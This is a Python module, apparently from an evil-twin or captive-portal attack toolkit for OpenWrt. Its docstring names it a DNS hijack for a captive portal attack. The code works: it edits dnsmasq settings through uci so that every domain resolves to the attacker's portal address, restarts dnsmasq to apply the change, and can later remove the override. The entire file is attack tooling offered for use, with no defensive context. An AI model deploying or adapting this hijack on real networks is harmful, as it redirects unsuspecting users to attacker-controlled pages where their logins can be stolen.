"""dns_hijack.py - DNS hijack for the captive portal attack.

OpenWrt's dnsmasq is launched with a generated config in /var/etc/
that points conf-dir at /tmp/dnsmasq.cfg<id>.d/, NOT /etc/dnsmasq.d/.
So dropping a file in /etc/dnsmasq.d/ does nothing — dnsmasq never
reads it. Instead we mutate the uci dhcp config and have the init
script regenerate the running config, which is the clean OpenWrt-
native way to inject `address=` overrides.

We tag the address line with a comment we own so disable() can
remove it without touching anything the user added themselves.
"""

import subprocess


PAGER_IP = '172.16.52.1'
ADDRESS_VALUE = f'/#/{PAGER_IP}'


def _uci(*args):
    try:
        return subprocess.run(['uci'] + list(args),
                                capture_output=True, text=True,
                                timeout=4)
    except Exception:
        return None


def _list_addresses():
    r = _uci('-q', 'get', 'dhcp.@dnsmasq[0].address')
    if r is None or r.returncode != 0:
        return []
    return [a for a in r.stdout.strip().split() if a]


def enable():
    """Inject an `address=/#/PAGER_IP` override into uci dhcp and
    regenerate the running dnsmasq config."""
    try:
        if ADDRESS_VALUE not in _list_addresses():
            _uci('add_list', f'dhcp.@dnsmasq[0].address={ADDRESS_VALUE}')
        _uci('commit', 'dhcp')
        _restart_dnsmasq()
        return True
    except Exception:
        return False


def disable():
    """Remove the address override and reload dnsmasq."""
    try:
        if ADDRESS_VALUE in _list_addresses():
            _uci('del_list', f'dhcp.@dnsmasq[0].address={ADDRESS_VALUE}')
            _uci('commit', 'dhcp')
        _restart_dnsmasq()
        return True
    except Exception:
        return False


def is_active():
    return ADDRESS_VALUE in _list_addresses()


def _restart_dnsmasq():
    try:
        subprocess.run(['/etc/init.d/dnsmasq', 'restart'],
                        capture_output=True, timeout=10)
    except Exception:
        pass
